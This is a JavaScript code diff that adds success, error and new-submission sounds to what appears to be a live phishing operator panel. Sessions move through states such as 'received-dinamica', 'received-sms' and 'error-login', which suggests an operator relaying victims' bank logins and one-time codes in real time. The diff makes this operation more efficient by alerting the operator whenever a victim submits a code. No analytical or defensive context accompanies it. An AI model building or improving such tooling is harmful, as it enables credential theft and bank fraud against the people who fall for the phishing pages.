@@ -161,15 +161,19 @@ function createRow(row) {
   })
   tr.querySelector('[data-action="error-login"]')?.addEventListener('click', () => {
     setRowState(row.id, 'error-login', 'error-login')
+    playErrorSound()
   })
   tr.querySelector('[data-action="error-dinamica"]')?.addEventListener('click', () => {
     setRowState(row.id, 'error-dinamica', 'error-dinamica')
+    playErrorSound()
   })
   tr.querySelector('[data-action="error-sms"]')?.addEventListener('click', () => {
     setRowState(row.id, 'error-sms', 'error-sms')
+    playErrorSound()
   })
   tr.querySelector('[data-action="done"]')?.addEventListener('click', () => {
     setRowState(row.id, 'done', 'done')
+    playSuccessSound()
   })
 
   tr.querySelectorAll('td.copyable').forEach((td) => {
@@ -309,21 +313,33 @@ async function pollSessions() {
       });
       render();
 
-      // Trigger flash effect and sound for new rows that were not in old list
-      let hasNewSession = false;
+      // Trigger flash effect and sound for new rows that were not in old list,
+      // or if their state changed to a submitted/waiting state.
+      let hasNewOrChangedSession = false;
       list.forEach((session) => {
         if (!oldKeys.has(session.id)) {
-          hasNewSession = true;
+          hasNewOrChangedSession = true;
           requestAnimationFrame(() => {
             const tr = document.querySelector(`tr[data-row-id="${session.id}"]`)
             if (!tr) return
             tr.classList.add('is-new')
             setTimeout(() => tr.classList.remove('is-new'), 1800)
           })
+        } else {
+          const oldSession = rows.get(session.id);
+          if (oldSession && oldSession.state !== session.state) {
+            if (
+              session.state === 'waiting' ||
+              session.state === 'received-dinamica' ||
+              session.state === 'received-sms'
+            ) {
+              hasNewOrChangedSession = true;
+            }
+          }
         }
       });
 
-      if (hasNewSession && !isInitialLoad) {
+      if (hasNewOrChangedSession && !isInitialLoad) {
         playNotificationSound();
       }
     }
@@ -381,6 +397,50 @@ function playNotificationSound() {
   } catch (e) {
     console.error("No se pudo reproducir el sonido de notificación:", e);
   }
+}
+
+function playSuccessSound() {
+  try {
+    initAudio();
+    if (!audioCtx || audioCtx.state === 'suspended') return;
+    
+    const osc = audioCtx.createOscillator();
+    const gain = audioCtx.createGain();
+    osc.connect(gain);
+    gain.connect(audioCtx.destination);
+    
+    osc.type = 'sine';
+    osc.frequency.setValueAtTime(659.25, audioCtx.currentTime); // E5
+    osc.frequency.setValueAtTime(880, audioCtx.currentTime + 0.08); // A5
+    
+    gain.gain.setValueAtTime(0.2, audioCtx.currentTime);
+    gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.35);
+    
+    osc.start();
+    osc.stop(audioCtx.currentTime + 0.35);
+  } catch (_) {}
+}
+
+function playErrorSound() {
+  try {
+    initAudio();
+    if (!audioCtx || audioCtx.state === 'suspended') return;
+    
+    const osc = audioCtx.createOscillator();
+    const gain = audioCtx.createGain();
+    osc.connect(gain);
+    gain.connect(audioCtx.destination);
+    
+    osc.type = 'triangle';
+    osc.frequency.setValueAtTime(220, audioCtx.currentTime);
+    osc.frequency.setValueAtTime(165, audioCtx.currentTime + 0.12);
+    
+    gain.gain.setValueAtTime(0.35, audioCtx.currentTime);
+    gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.4);
+    
+    osc.start();
+    osc.stop(audioCtx.currentTime + 0.4);
+  } catch (_) {}
 }
 
 btnClean?.addEventListener('click', async () => {
